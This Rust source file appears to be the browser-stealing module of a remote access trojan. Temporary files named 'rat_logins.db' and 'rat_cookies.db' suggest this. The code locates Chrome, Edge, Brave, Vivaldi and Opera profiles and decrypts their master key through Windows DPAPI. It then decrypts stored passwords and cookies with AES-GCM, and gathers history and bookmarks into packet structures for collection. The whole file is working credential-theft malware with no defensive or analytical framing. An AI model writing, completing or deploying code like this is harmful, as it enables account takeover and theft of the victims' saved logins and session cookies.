use std::path::{Path, PathBuf};
use std::fs;
use rusqlite::{Connection, OpenFlags};
use common::packets::{BrowserResult, PasswordEntry, CookieEntry, HistoryEntry, BookmarkEntry, BrowserData};
use aes_gcm::{Aes256Gcm, Key, Nonce, aead::Aead, KeyInit};
use winapi::um::dpapi::CryptUnprotectData;
use winapi::um::wincrypt::DATA_BLOB;
use std::ptr;
use base64::{Engine as _, engine::general_purpose};

struct BrowserInfo {
    name: &'static str,
    base_path: &'static str,
}

const BROWSERS: &[BrowserInfo] = &[
    BrowserInfo { name: "Chrome", base_path: "Google\\Chrome\\User Data" },
    BrowserInfo { name: "Edge", base_path: "Microsoft\\Edge\\User Data" },
    BrowserInfo { name: "Brave", base_path: "BraveSoftware\\Brave-Browser\\User Data" },
    BrowserInfo { name: "Vivaldi", base_path: "Vivaldi\\User Data" },
    BrowserInfo { name: "Opera", base_path: "Opera Software\\Opera Stable" },
    BrowserInfo { name: "Opera GX", base_path: "Opera Software\\Opera GX Stable" },
];

pub fn get_browser_data() -> BrowserData {
    let mut results = Vec::new();
    let app_data = std::env::var("LOCALAPPDATA").unwrap_or_default();

    for browser in BROWSERS {
        let path = PathBuf::from(&app_data).join(browser.base_path);
        if path.exists() {
            if let Some(data) = extract_from_browser(browser.name, &path) {
                results.push(data);
            }
        }
    }

    BrowserData { browsers: results }
}

fn extract_from_browser(name: &str, path: &Path) -> Option<BrowserResult> {
    let mut passwords = Vec::new();
    let mut cookies = Vec::new();
    let mut history = Vec::new();
    let mut bookmarks = Vec::new();

    // Chromium browsers can have multiple profiles (Default, Profile 1, etc.)
    // We'll look for Login Data, Cookies, History in Default and Profile X
    let profiles = ["Default", "Profile 1", "Profile 2", "Profile 3"];
    
    let master_key = get_master_key(path);

    for profile in &profiles {
        let profile_path = path.join(profile);
        if !profile_path.exists() { continue; }

        // Passwords
        if let Some(key) = &master_key {
            let login_db = profile_path.join("Login Data");
            if login_db.exists() {
                extract_passwords(&login_db, key, &mut passwords);
            }

            let cookie_db = profile_path.join("Network").join("Cookies");
            let cookie_db_old = profile_path.join("Cookies");
            if cookie_db.exists() {
                extract_cookies(&cookie_db, key, &mut cookies);
            } else if cookie_db_old.exists() {
                extract_cookies(&cookie_db_old, key, &mut cookies);
            }
        }

        // History
        let history_db = profile_path.join("History");
        if history_db.exists() {
            extract_history(&history_db, &mut history);
        }

        // Bookmarks
        let bookmark_file = profile_path.join("Bookmarks");
        if bookmark_file.exists() {
            extract_bookmarks(&bookmark_file, &mut bookmarks);
        }
    }

    if passwords.is_empty() && cookies.is_empty() && history.is_empty() && bookmarks.is_empty() {
        None
    } else {
        Some(BrowserResult {
            name: name.to_string(),
            passwords,
            cookies,
            history,
            bookmarks,
        })
    }
}

fn get_master_key(path: &Path) -> Option<Vec<u8>> {
    let local_state_path = path.join("Local State");
    if !local_state_path.exists() { return None; }

    let content = fs::read_to_string(local_state_path).ok()?;
    let json: serde_json::Value = serde_json::from_str(&content).ok()?;
    let encrypted_key_b64 = json["os_crypt"]["os_encrypted_key"].as_str()?;
    let encrypted_key = general_purpose::STANDARD.decode(encrypted_key_b64).ok()?;

    // Key is DPAPI encrypted, starts with "DPAPI"
    if !encrypted_key.starts_with(b"DPAPI") { return None; }
    let encrypted_key = &encrypted_key[5..];

    unsafe {
        let mut input = DATA_BLOB {
            cbData: encrypted_key.len() as u32,
            pbData: encrypted_key.as_ptr() as *mut _,
        };
        let mut output = DATA_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        if CryptUnprotectData(&mut input, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, &mut output) != 0 {
            let key = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
            winapi::um::winbase::LocalFree(output.pbData as *mut _);
            Some(key)
        } else {
            None
        }
    }
}

fn decrypt_aes_gcm(data: &[u8], key: &[u8]) -> Option<String> {
    if data.len() < 15 { return None; }
    // data starts with "v10" or "v11"
    let nonce = &data[3..15];
    let ciphertext = &data[15..];
    
    let key = Key::<Aes256Gcm>::from_slice(key);
    let cipher = Aes256Gcm::new(key);
    let nonce = Nonce::from_slice(nonce);

    cipher.decrypt(nonce, ciphertext).ok().and_then(|b| String::from_utf8(b).ok())
}

fn extract_passwords(db_path: &Path, master_key: &[u8], results: &mut Vec<PasswordEntry>) {
    // Copy DB to avoid lock
    let temp_db = std::env::temp_dir().join("rat_logins.db");
    if fs::copy(db_path, &temp_db).is_err() { return; }

    if let Ok(conn) = Connection::open_with_flags(&temp_db, OpenFlags::SQLITE_OPEN_READ_ONLY) {
        let stmt = conn.prepare("SELECT origin_url, username_value, password_value FROM logins").ok();
        if let Some(mut stmt) = stmt {
            let rows = stmt.query_map([], |row| {
                let url: String = row.get(0)?;
                let user: String = row.get(1)?;
                let pass_enc: Vec<u8> = row.get(2)?;
                Ok((url, user, pass_enc))
            }).ok();

            if let Some(rows) = rows {
                for row in rows.flatten() {
                    if let Some(pass) = decrypt_aes_gcm(&row.2, master_key) {
                        if !pass.is_empty() {
                            results.push(PasswordEntry {
                                url: row.0,
                                username: row.1,
                                password: pass,
                            });
                        }
                    }
                }
            }
        }
    }
    let _ = fs::remove_file(temp_db);
}

fn extract_cookies(db_path: &Path, master_key: &[u8], results: &mut Vec<CookieEntry>) {
    let temp_db = std::env::temp_dir().join("rat_cookies.db");
    if fs::copy(db_path, &temp_db).is_err() { return; }

    if let Ok(conn) = Connection::open_with_flags(&temp_db, OpenFlags::SQLITE_OPEN_READ_ONLY) {
        let stmt = conn.prepare("SELECT host_key, name, encrypted_value, path, expires_utc FROM cookies").ok();
        if let Some(mut stmt) = stmt {
            let rows = stmt.query_map([], |row| {
                let host: String = row.get(0)?;
                let name: String = row.get(1)?;
                let val_enc: Vec<u8> = row.get(2)?;
                let path: String = row.get(3)?;
                let expires: i64 = row.get(4)?;
                Ok((host, name, val_enc, path, expires))
            }).ok();

            if let Some(rows) = rows {
                for row in rows.flatten() {
                    if let Some(val) = decrypt_aes_gcm(&row.2, master_key) {
                        results.push(CookieEntry {
                            domain: row.0,
                            name: row.1,
                            value: val,
                            path: row.3,
                            expires: row.4.to_string(),
                        });
                    }
                }
            }
        }
    }
    let _ = fs::remove_file(temp_db);
}

fn extract_history(db_path: &Path, results: &mut Vec<HistoryEntry>) {
    let temp_db = std::env::temp_dir().join("rat_history.db");
    if fs::copy(db_path, &temp_db).is_err() { return; }

    if let Ok(conn) = Connection::open_with_flags(&temp_db, OpenFlags::SQLITE_OPEN_READ_ONLY) {
        let stmt = conn.prepare("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500").ok();
        if let Some(mut stmt) = stmt {
            let rows = stmt.query_map([], |row| {
                let url: String = row.get(0)?;
                let title: String = row.get(1)?;
                let count: i32 = row.get(2)?;
                let time: i64 = row.get(3)?;
                Ok(HistoryEntry {
                    url,
                    title,
                    visit_count: count,
                    last_visit: time.to_string(),
                })
            }).ok();

            if let Some(rows) = rows {
                for row in rows.flatten() {
                    results.push(row);
                }
            }
        }
    }
    let _ = fs::remove_file(temp_db);
}

fn extract_bookmarks(path: &Path, results: &mut Vec<BookmarkEntry>) {
    if let Ok(content) = fs::read_to_string(path) {
        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
            if let Some(roots) = json["roots"].as_object() {
                for (_, root) in roots {
                    parse_bookmark_node(root, results);
                }
            }
        }
    }
}

fn parse_bookmark_node(node: &serde_json::Value, results: &mut Vec<BookmarkEntry>) {
    if let Some(children) = node["children"].as_array() {
        for child in children {
            parse_bookmark_node(child, results);
        }
    } else if let (Some(url), Some(name)) = (node["url"].as_str(), node["name"].as_str()) {
        results.push(BookmarkEntry {
            url: url.to_string(),
            title: name.to_string(),
        });
    }
}
